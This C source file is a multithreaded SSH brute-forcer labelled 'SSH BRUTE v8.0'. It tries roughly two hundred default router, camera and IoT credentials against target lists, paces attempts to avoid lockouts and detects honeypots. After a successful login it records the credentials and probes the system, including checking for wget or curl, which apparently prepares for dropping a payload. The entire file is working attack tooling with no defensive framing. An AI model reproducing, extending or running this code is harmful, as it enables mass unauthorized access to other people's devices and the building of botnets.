#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#if defined(__GNUC__) && (__GNUC__ < 5) && !defined(__clang__)
#define atomic_int volatile int
#define atomic_fetch_add(ptr, val) __atomic_fetch_add((ptr), (val), __ATOMIC_SEQ_CST)
#define atomic_fetch_sub(ptr, val) __atomic_fetch_sub((ptr), (val), __ATOMIC_SEQ_CST)
#define atomic_load(ptr) __atomic_load_n((ptr), __ATOMIC_SEQ_CST)
#define atomic_store(ptr, val) __atomic_store_n((ptr), (val), __ATOMIC_SEQ_CST)
#else
#include <stdatomic.h>
#endif
#include <time.h>
#include <ctype.h>
#include <sys/resource.h>
#include <semaphore.h>
#include <net/if.h>
#include <sys/ioctl.h>

#include "rawssh.h"

#define C_RESET "\033[0m"
#define C_BOLD "\033[1m"
#define C_BLUE "\033[94m"
#define C_GREEN "\033[92m"
#define C_YELLOW "\033[93m"
#define C_WHITE "\033[97m"
#define C_GRAY "\033[90m"
#define C_ORANGE "\033[38;5;208m"
#define C_RED "\033[91m"
#define C_CYAN "\033[96m"
#define CLEAR_SCREEN "\033[2J\033[H"
#define HIDE_CURSOR "\033[?25l"
#define SHOW_CURSOR "\033[?25h"

#define SYSINFO "uname -a 2>/dev/null|head -c100;echo;command -v wget>/dev/null&&echo W||{ command -v curl>/dev/null&&echo C||echo N;}"

#define AUTH_PER_CONN 100

typedef struct {
    const char *u;
    const char *p;
} Cred;

static const Cred CREDS[] = {
    {"root", "root"},
    {"root", "admin"},
    {"root", "1234"},
    {"root", "password"},
    {"admin", "admin"},
    {"admin", "1234"},
    {"admin", "12345"},
    {"admin", "password"},
    {"admin", "default"},
    {"ubnt", "ubnt"},
    {"pi", "raspberry"},
    {"pi", "pi"},
    {"pi", "banana"},
    {"banana", "pi"},
    {"raspberry", "pi"},
    {"vagrant", "vagrant"},
    {"user", "user"},
    {"test", "test"},
    {"guest", "guest"},
    {"support", "support"},
    {"12345", "12345"},
    {"admin", ""},
    {"admin", "1111111"},
    {"admin", "12345678"},
    {"admin", "2601hx"},
    {"admin", "7ujMko0admin"},
    {"admin", "88888888"},
    {"admin", "admin1234"},
    {"admin", "admin@123"},
    {"admin", "admin123"},
    {"Admin", "Admin"},
    {"admin", "adminpass"},
    {"admin", "adtran!"},
    {"admin", "aquario"},
    {"admin", "BrAhMoS@15"},
    {"admin", "firetide"},
    {"admin", "GeNeXiS@19"},
    {"admin", "h@32LuyD"},
    {"admin", "instar"},
    {"Administrator", "admin"},
    {"admin", "meinsm"},
    {"admin", "root"},
    {"admin", "samsung"},
    {"admin", "service"},
    {"admin", "VnT3ch@dm1n"},
    {"root", ""},
    {"root", "1001chin"},
    {"root", "1111"},
    {"root", "123456"},
    {"root", "12345"},
    {"root", "1234horses"},
    {"root", "20080826"},
    {"root", "2011vsta"},
    {"root", "3ep5w2u"},
    {"root", "54321"},
    {"root", "5up"},
    {"root", "666666"},
    {"root", "/*6.=_ja"},
    {"root", "7ujMko0admin"},
    {"root", "7ujMko0vizxv"},
    {"root", "888888"},
    {"root", "a1sev5y7c39k"},
    {"root", "adminpass"},
    {"root", "admintelecom1"},
    {"root", "alitvadmin"},
    {"root", "anko"},
    {"root", "antslq"},
    {"root", "arris"},
    {"root", "blender"},
    {"root", "default"},
    {"root", "dreambox"},
    {"root", "dropper"},
    {"root", "e2008jl"},
    {"root", "Fireitup"},
    {"root", "founder88"},
    {"root", "GM8182"},
    {"root", "grouter"},
    {"root", "hg2x0"},
    {"root", "hi3518"},
    {"root", "hipc3518"},
    {"root", "hkipc2016"},
    {"root", "hslwificam"},
    {"root", "huigu309"},
    {"root", "hunt5759"},
    {"root", "icatch99"},
    {"root", "ipc71a"},
    {"root", "ipcam"},
    {"root", "ipcam_rt5350"},
    {"root", "IPCam@sw"},
    {"root", "juantech"},
    {"root", "jvbzd"},
    {"root", "klv1234"},
    {"root", "klv123"},
    {"root", "LSiuY7pOmZG2s"},
    {"root", "oelinux123"},
    {"root", "pass"},
    {"root", "Pon521"},
    {"root", "root123"},
    {"root", "root621"},
    {"root", "solokey"},
    {"root", "star123"},
    {"root", "svgodie"},
    {"root", "system"},
    {"root", "t0talc0ntr0l4!"},
    {"root", "taZz@01"},
    {"root", "taZz@23495859"},
    {"root", "telecomadmin"},
    {"root", "telnet"},
    {"root", "tl789"},
    {"root", "tsgoingon"},
    {"root", "ttnet"},
    {"root", "uFwfBht5"},
    {"root", "unisheen"},
    {"root", "user"},
    {"root", "vizxv"},
    {"root", "wabjtam"},
    {"root", "xc12345"},
    {"root", "xc3511"},
    {"root", "xirtam"},
    {"root", "xmhdipc"},
    {"root", "zhongxing"},
    {"root", "zlxx."},
    {"root", "zmHDc0m"},
    {"root", "zsun1188"},
    {"root", "Zte521"},
    {"root", "Zxic521"},
    {"root", "zyad1234"},
    {"default", "12345"},
    {"default", "1cDuLJ7c"},
    {"default", "antslq"},
    {"default", "default"},
    {"default", "lJwpbo6"},
    {"default", "OxhlwSG8"},
    {"default", "S2fGqNFs"},
    {"default", "tlJwpbo6"},
    {"default", "tluafed"},
    {"guest", "123456"},
    {"guest", "12345"},
    {"user", "12345"},
    {"bin", "bin"},
    {"boards", "boards123"},
    {"cht", "chtsgpon"},
    {"cisco", "cisco123"},
    {"cisco", "cisco"},
    {"CUAdmin", "CUAdmin"},
    {"daemon", "daemon"},
    {"de", "S2"},
    {"draytek", "1234"},
    {"e8ehomeasb", "e8ehomeasb"},
    {"e8ehome", "e8ehome"},
    {"e8telnet", "e8telnet"},
    {"Epadmin", "adminEp"},
    {"epuser", "epuser"},
    {"ftp", "ftp"},
    {"ftp", "video"},
    {"haver", "haver123"},
    {"hikvision", "hikvision"},
    {"installer", "fiberinst"},
    {"nobody", "nobody"},
    {"oltuser", "olt!pass"},
    {"on_support", "fh1234"},
    {"onuser", "onuser123"},
    {"service", "serviceC0mp!"},
    {"super", "sp-admin"},
    {"super", "xJ4pCYeW"},
    {"support", "1234"},
    {"supportadmin", "supportadmin"},
    {"support_gp", "tplinkgp"},
    {"tech", "tech"},
    {"telecomadmin", "ADMIN"},
    {"telecomadmin", "admintelecom"},
    {"telecomadmin", "nE7jA%5m"},
    {"telnetadmin", "telnetadmin"},
    {"telnet", "telnet"},
    {"vstarcam2015", "20150602"},
    {"vstarcam2017", "20170912"},
};

#define NCREDS (sizeof(CREDS) / sizeof(CREDS[0]))

typedef struct {
    char ip[48];
    int port;
} Target;

typedef struct {
    char ip[48];
    int port;
    char user[32];
    char pass[32];
    int hp;
    char info[200];
} Result;

static Target *g_targets;
static int g_ntargets;
static Result *g_results;
static int g_nresults;
static int g_rescap;
static pthread_mutex_t g_resmtx = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t g_filemtx = PTHREAD_MUTEX_INITIALIZER;

static atomic_int G_tested;
static atomic_int G_found;
static atomic_int G_real;
static atomic_int G_hp;
static atomic_int G_done;
static atomic_int G_active;
static atomic_int G_next;
static atomic_int G_tcp_ok;
static atomic_int G_tcp_err;
static atomic_int G_ssh_ok;
static atomic_int G_ssh_err;
static atomic_int G_wrong;
static atomic_int G_sess_err;
static atomic_int G_ssh_timeout;
static atomic_int G_ssh_tcperr;
static atomic_int G_ssh_hsfail;
static atomic_int G_ssh_proto;
static atomic_int G_ssh_other;
static atomic_int G_ssh_closed;
static pthread_mutex_t g_logmtx = PTHREAD_MUTEX_INITIALIZER;

static int g_threads = 200;
static int g_timeout = 5;
static int g_maxconn = 1000;
static sem_t g_sem;
static time_t g_start;
static atomic_int g_run = 1;
static char g_nic[64] = {0};

static void raise_limits() {
    struct rlimit r = {1048576, 1048576};
    setrlimit(RLIMIT_NOFILE, &r);
}

static void detect_nic() {
    if (g_nic[0])
        return;

    FILE *fp = fopen("/proc/net/dev", "r");
    if (!fp)
        return;

    char line[256];

    if (!fgets(line, sizeof(line), fp)) {
        fclose(fp);
        return;
    }
    if (!fgets(line, sizeof(line), fp)) {
        fclose(fp);
        return;
    }

    while (fgets(line, sizeof(line), fp)) {
        char *p = line;
        while (*p && isspace(*p))
            p++;
        char *c = strchr(p, ':');
        if (!c)
            continue;
        *c = 0;
        if (strcmp(p, "lo") == 0)
            continue;
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0)
            continue;
        struct ifreq ifr;
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, p, IFNAMSIZ - 1);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (ifr.ifr_flags & IFF_UP) {
                strncpy(g_nic, p, sizeof(g_nic) - 1);
                close(sock);
                fclose(fp);
                return;
            }
        }
        close(sock);
    }
    fclose(fp);
}

static int load_targets(const char *f) {
    FILE *fp = fopen(f, "r");
    if (!fp)
        return 0;

    int cap = 500000;
    g_targets = malloc(cap * sizeof(Target));
    char line[128];

    while (fgets(line, sizeof(line), fp)) {
        char *p = line;
        while (*p && isspace(*p))
            p++;
        if (!*p || *p == '#')
            continue;
        char *e = p + strlen(p) - 1;
        while (e > p && isspace(*e))
            *e-- = 0;
        if (g_ntargets >= cap) {
            cap *= 2;
            g_targets = realloc(g_targets, cap * sizeof(Target));
        }
        char *c = strrchr(p, ':');
        if (c) {
            *c = 0;
            strncpy(g_targets[g_ntargets].ip, p, 47);
            g_targets[g_ntargets].port = atoi(c + 1);
        } else {
            strncpy(g_targets[g_ntargets].ip, p, 47);
            g_targets[g_ntargets].port = 22;
        }
        g_ntargets++;
    }
    fclose(fp);
    return g_ntargets;
}

static int ssh_exec_cmd(rawssh_session *ses, const char *cmd, char *out, int sz) {
    rawssh_channel *c = rawssh_channel_open(ses);
    if (!c)
        return 0;
    if (rawssh_channel_exec(c, cmd) != RAWSSH_OK) {
        rawssh_channel_close(c);
        rawssh_channel_free(c);
        return 0;
    }
    int t = 0;
    int r;
    char buf[256];
    for (int i = 0; i < 50; i++) {
        r = rawssh_channel_read(c, buf, sizeof(buf) - 1);
        if (r > 0 && t + r < sz) {
            memcpy(out + t, buf, r);
            t += r;
        } else if (r <= 0) {
            break;
        }
    }
    out[t] = 0;
    rawssh_channel_close(c);
    rawssh_channel_free(c);
    return t;
}

static int check_hp(rawssh_session *s) {
    char buf[256] = {0};
    int r;

    r = ssh_exec_cmd(s, "ls -la /dev/null 2>/dev/null", buf, sizeof(buf));
    if (r <= 0)
        return 1;

    char *p = buf;
    while (*p && ((unsigned char)*p <= 0x20))
        p++;
    if (*p != 'c')
        return 1;

    memset(buf, 0, sizeof(buf));
    r = ssh_exec_cmd(s, "TERM=xterm clear 2>/dev/null", buf, sizeof(buf));
    if (r <= 0)
        return 1;

    for (int i = 0; i < r; i++) {
        if (buf[i] == 0x1b)
            return 0;
    }
    return 1;
}

static void get_info(rawssh_session *s, char *out, int sz) {
    char buf[256] = {0};
    ssh_exec_cmd(s, SYSINFO, buf, sizeof(buf));
    for (int i = 0; buf[i]; i++) {
        if (buf[i] == '\n')
            buf[i] = ' ';
    }
    char *d = out;
    char *p = buf;
    while (*p) {
        while (*p == ' ' && *(p + 1) == ' ')
            p++;
        if (d - out < sz - 1)
            *d++ = *p;
        p++;
    }
    *d = 0;
}

static void save_result(Result *r) {
    pthread_mutex_lock(&g_resmtx);
    if (g_nresults >= g_rescap) {
        g_rescap = g_rescap ? g_rescap * 2 : 256;
        g_results = realloc(g_results, g_rescap * sizeof(Result));
    }
    g_results[g_nresults++] = *r;
    pthread_mutex_unlock(&g_resmtx);

    pthread_mutex_lock(&g_filemtx);
    const char *fn = (r->hp == 1) ? "honeypots.txt" : "valid_linux.txt";
    FILE *fp = fopen(fn, "a");
    if (fp) {
        fprintf(fp, "%s:%d %s:%s", r->ip, r->port, r->user, r->pass);
        if (r->info[0])
            fprintf(fp, " | %s", r->info);
        fprintf(fp, "\n");
        fclose(fp);
    }
    pthread_mutex_unlock(&g_filemtx);
}

static rawssh_session *open_session(const char *ip, int port) {
    rawssh_session *ses = rawssh_session_new();
    if (!ses)
        return NULL;
    rawssh_set_timeout(ses, g_timeout);
    if (g_nic[0])
        rawssh_bind_nic(ses, g_nic);

    int rc = rawssh_connect(ses, ip, port);
    if (rc != RAWSSH_OK) {
        atomic_fetch_add(&G_tcp_err, 1);
        rawssh_session_free(ses);
        return NULL;
    }
    atomic_fetch_add(&G_tcp_ok, 1);

    rc = rawssh_handshake(ses);
    if (rc != RAWSSH_OK) {
        atomic_fetch_add(&G_ssh_err, 1);
        switch (rc) {
            case RAWSSH_TIMEOUT:
                atomic_fetch_add(&G_ssh_timeout, 1);
                break;
            case RAWSSH_TCP_ERROR:
                atomic_fetch_add(&G_ssh_tcperr, 1);
                break;
            case RAWSSH_CLOSED:
                atomic_fetch_add(&G_ssh_closed, 1);
                break;
            case RAWSSH_HANDSHAKE_FAIL:
                atomic_fetch_add(&G_ssh_hsfail, 1);
                break;
            case RAWSSH_PROTO_ERROR:
                atomic_fetch_add(&G_ssh_proto, 1);
                break;
            default:
                atomic_fetch_add(&G_ssh_other, 1);
                break;
        }
        int err_total = atomic_load(&G_ssh_err);
        if (err_total <= 500) {
            pthread_mutex_lock(&g_logmtx);
            FILE *lf = fopen("ssh_errors.log", "a");
            if (lf) {
                fprintf(lf, "%s:%d handshake_fail rc=%d (%s) step=%s\n",
                        ip, port, rc, rawssh_error_str(rc),
                        rawssh_handshake_step_str(ses));
                fclose(lf);
            }
            pthread_mutex_unlock(&g_logmtx);
        }
        rawssh_disconnect(ses);
        rawssh_session_free(ses);
        return NULL;
    }
    atomic_fetch_add(&G_ssh_ok, 1);
    return ses;
}

static void close_session(rawssh_session *ses) {
    if (!ses)
        return;
    rawssh_disconnect(ses);
    rawssh_session_free(ses);
}

static void process(int idx) {
    Target *t = &g_targets[idx];
    atomic_fetch_add(&G_active, 1);

    unsigned int rng_seed = (unsigned int)(idx ^ time(NULL) ^ (uintptr_t)pthread_self());

    sem_wait(&g_sem);

    rawssh_session *ses = open_session(t->ip, t->port);
    if (!ses) {
        sem_post(&g_sem);
        goto done;
    }

    int combo = 0;
    int total = NCREDS;
    int errs = 0;
    int auth_count = 0;

    while (combo < total) {
        if (auth_count >= AUTH_PER_CONN) {
            close_session(ses);
            usleep(50000 + (rand_r(&rng_seed) % 50000));
            ses = open_session(t->ip, t->port);
            if (!ses) {
                usleep(200000);
                ses = open_session(t->ip, t->port);
                if (!ses) {
                    sem_post(&g_sem);
                    goto done;
                }
            }
            auth_count = 0;
        }

        atomic_fetch_add(&G_tested, 1);

        int rc = rawssh_auth_password(ses, CREDS[combo].u, CREDS[combo].p);

        if (rc == RAWSSH_OK) {
            atomic_fetch_add(&G_found, 1);
            int hp = check_hp(ses);
            char info[200] = {0};
            if (hp == 0)
                get_info(ses, info, 199);
            if (hp == 1)
                atomic_fetch_add(&G_hp, 1);
            else
                atomic_fetch_add(&G_real, 1);

            Result r = {.port = t->port, .hp = hp};
            strncpy(r.ip, t->ip, 47);
            strncpy(r.user, CREDS[combo].u, 31);
            strncpy(r.pass, CREDS[combo].p, 31);
            strncpy(r.info, info, 199);
            save_result(&r);

            close_session(ses);
            sem_post(&g_sem);
            goto done;
        }

        if (rc == RAWSSH_AUTH_FAIL) {
            atomic_fetch_add(&G_wrong, 1);
            combo++;
            auth_count++;
            errs = 0;
            continue;
        }

        close_session(ses);
        ses = NULL;

        if (rc == RAWSSH_CLOSED) {
            usleep(100000 + (rand_r(&rng_seed) % 100000));
            ses = open_session(t->ip, t->port);
            if (!ses) {
                sem_post(&g_sem);
                goto done;
            }
            auth_count = 0;
            continue;
        }

        atomic_fetch_add(&G_sess_err, 1);
        if (++errs >= 5) {
            sem_post(&g_sem);
            goto done;
        }

        usleep(200000);
        ses = open_session(t->ip, t->port);
        if (!ses) {
            sem_post(&g_sem);
            goto done;
        }
        auth_count = 0;
    }

    close_session(ses);
    sem_post(&g_sem);

done:
    atomic_fetch_sub(&G_active, 1);
    atomic_fetch_add(&G_done, 1);
}

static void draw() {
    int el = (int)(time(NULL) - g_start);
    if (el < 1)
        el = 1;
    int done = atomic_load(&G_done);
    int act = atomic_load(&G_active);
    int tested = atomic_load(&G_tested);
    int found = atomic_load(&G_found);
    int real = atomic_load(&G_real);
    int hp = atomic_load(&G_hp);
    int tcp_ok = atomic_load(&G_tcp_ok);
    int tcp_err = atomic_load(&G_tcp_err);
    int ssh_ok = atomic_load(&G_ssh_ok);
    int ssh_err = atomic_load(&G_ssh_err);
    int wrong = atomic_load(&G_wrong);
    int sess_err = atomic_load(&G_sess_err);
    float pct = g_ntargets ? (done * 100.0f / g_ntargets) : 0;
    int spd = tested * 60 / el;
    int ips = done / el;

    printf(CLEAR_SCREEN);
    printf("\n  %s%sSSH BRUTE v8.0 [RawSSH]%s  %d threads | %ds timeout | max %d conn",
           C_BOLD, C_CYAN, C_RESET, g_threads, g_timeout, g_maxconn);
    if (g_nic[0])
        printf(" | NIC: %s%s%s", C_GREEN, g_nic, C_RESET);
    printf("\n\n");
    printf("  %sProgress:%s %d/%d (%s%.1f%%%s)  %sActive:%s %d  %sSpeed:%s %d/min  %sIPs/s:%s %d\n",
           C_YELLOW, C_RESET, done, g_ntargets, C_GREEN, pct, C_RESET,
           C_YELLOW, C_RESET, act, C_YELLOW, C_RESET, spd, C_YELLOW, C_RESET, ips);
    printf("  %sTime:%s %02d:%02d  %sFound:%s %s%d%s  %sReal:%s %s%d%s  %sHP:%s %s%d%s\n\n",
           C_YELLOW, C_RESET, el / 60, el % 60,
           C_BOLD, C_RESET, C_GREEN, found, C_RESET,
           C_BOLD, C_RESET, C_GREEN, real, C_RESET,
           C_BOLD, C_RESET, C_ORANGE, hp, C_RESET);

    int tcp_tot = tcp_ok + tcp_err;
    int ssh_tot = ssh_ok + ssh_err;
    printf("  %sTCP:%s %d/%d (%.0f%% ok)  %sSSH:%s %d/%d (%.0f%% ok)  %sWrong:%s %d  %sSessErr:%s %d\n",
           C_GRAY, C_RESET, tcp_ok, tcp_tot, tcp_tot ? (tcp_ok * 100.0f / tcp_tot) : 0,
           C_GRAY, C_RESET, ssh_ok, ssh_tot, ssh_tot ? (ssh_ok * 100.0f / ssh_tot) : 0,
           C_GRAY, C_RESET, wrong,
           C_RED, C_RESET, sess_err);
    if (ssh_err > 0) {
        printf("  %sSSH Errors:%s TMO=%d TCP=%d CLS=%d HS=%d PROTO=%d OTHER=%d\n",
               C_RED, C_RESET,
               atomic_load(&G_ssh_timeout),
               atomic_load(&G_ssh_tcperr),
               atomic_load(&G_ssh_closed),
               atomic_load(&G_ssh_hsfail),
               atomic_load(&G_ssh_proto),
               atomic_load(&G_ssh_other));
    }
    printf("\n");

    pthread_mutex_lock(&g_resmtx);
    int st = (g_nresults > 8) ? g_nresults - 8 : 0;
    for (int i = st; i < g_nresults; i++) {
        Result *r = &g_results[i];
        const char *tag = r->hp == 1 ? "[HP]" : "[OK]";
        const char *col = r->hp == 1 ? C_ORANGE : C_GREEN;
        printf("  %s%s%s %s:%d %s%s%s:%s%s%s\n",
               col, tag, C_RESET, r->ip, r->port,
               C_WHITE, r->user, C_RESET, C_YELLOW, r->pass, C_RESET);
        if (r->hp == 0 && r->info[0])
            printf("       %s%s%s\n", C_GRAY, r->info, C_RESET);
    }
    pthread_mutex_unlock(&g_resmtx);
    printf("\n");
    fflush(stdout);
}

static void *panel_fn(void *_) {
    (void)_;
    while (atomic_load(&g_run)) {
        draw();
        usleep(500000);
    }
    draw();
    return NULL;
}

static void *worker_fn(void *_) {
    (void)_;
    int i;
    while ((i = atomic_fetch_add(&G_next, 1)) < g_ntargets)
        process(i);
    return NULL;
}

int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-t"))
            g_threads = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-T"))
            g_timeout = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-c"))
            g_maxconn = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-i"))
            strncpy(g_nic, argv[++i], sizeof(g_nic) - 1);
        else if (!strcmp(argv[i], "-h")) {
            printf("Usage: %s [-t threads] [-T timeout] [-c max_conn] [-i nic]\n", argv[0]);
            printf("  -t  Threads (default: 200)\n");
            printf("  -T  Timeout (default: 5)\n");
            printf("  -c  Max connections (default: 1000)\n");
            printf("  -i  Network interface to bind (auto-detect if omitted)\n");
            return 0;
        }
    }

    raise_limits();
    detect_nic();

    if (!load_targets("ssh.txt")) {
        printf("Need ssh.txt\n");
        return 1;
    }

    sem_init(&g_sem, 0, g_maxconn);
    rawssh_global_init();

    printf(HIDE_CURSOR);
    g_start = time(NULL);

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 128 * 1024);

    pthread_t panel;
    pthread_create(&panel, NULL, panel_fn, NULL);

    pthread_t *pool = malloc(g_threads * sizeof(pthread_t));
    int n = 0;
    for (int i = 0; i < g_threads; i++) {
        if (!pthread_create(&pool[i], &attr, worker_fn, NULL))
            n++;
    }

    for (int i = 0; i < n; i++)
        pthread_join(pool[i], NULL);

    atomic_store(&g_run, 0);
    usleep(600000);
    pthread_join(panel, NULL);

    printf(SHOW_CURSOR);
    printf("\n  %sDONE!%s Found: %d (Real: %d, HP: %d)\n",
           C_BOLD, C_RESET, atomic_load(&G_found), atomic_load(&G_real), atomic_load(&G_hp));
    if (atomic_load(&G_real) || atomic_load(&G_hp) == 0)
        printf("  %s> valid_linux.txt%s\n", C_GREEN, C_RESET);
    if (atomic_load(&G_hp))
        printf("  %s> honeypots.txt%s\n", C_ORANGE, C_RESET);
    printf("\n");

    sem_destroy(&g_sem);
    free(pool);
    free(g_targets);
    free(g_results);
    rawssh_global_cleanup();
    return 0;
}